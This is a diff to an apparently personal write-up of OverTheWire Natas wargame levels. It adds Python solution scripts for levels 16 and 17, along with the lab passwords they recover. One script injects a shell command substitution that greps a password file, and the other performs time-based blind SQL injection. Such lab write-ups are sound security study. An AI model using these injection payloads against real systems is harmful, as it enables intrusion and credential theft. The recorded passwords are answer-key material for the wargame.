@@ -294,6 +294,71 @@ TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
 <summary>Level 16 - > Level 17</summary>
 
 ```
+# !/usr/bin/env python
+import requests
+url = 'http://natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V@natas16.natas.labs.overthewire.org'
+username = 'natas16'
+password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
+key = ""
+char = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXXYZ"
+
+while len(key) < 32:
+    for i in range(len(char)):
+        payload = {'needle': '$(grep ^'+key+char[i]+' /etc/natas_webpass/natas17)wrong', 'submit':'Search'}
+        # print(payload['needle'])
+        req = requests.get(url, params=payload)
+        # print(req.text)
+        if 'wrong' not in req.text:
+            key += char[i]
+            print(key)
+            break
+
+
+XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+```
+
+</details>
+
+<details open>
+<summary>Level 17 - > Level 18</summary>
+
+```
+# !/usr/bin/env python
+import requests
+url = 'http://natas17.natas.labs.overthewire.org/index.php'
+username = 'natas17'
+password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
+key = ""
+
+for pos in range(1,33):
+    low = 32
+    high = 126
+    while low < high:
+        mid = (high + low) >> 1
+        # print low,mid,high
+        payload = "natas18\" and if(%d < ascii(mid(password,%d,1)), sleep(2), 1) and \"\" like \"" % (mid, pos)
+
+        try:
+            req = requests.post(url, auth=requests.auth.HTTPBasicAuth(username, password), data={"username": payload},
+                                timeout=2)
+        except requests.RequestException as e:
+            low = mid + 1
+            mid = (high + low) >> 1
+            continue
+        high = mid
+        # mid = (high + low) >> 1
+    key += chr(mid)
+    print(key)
+
+8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+```
+
+</details>
+
+<details open>
+<summary>Level 18 - > Level 19</summary>
+
+```
 
 ```
 
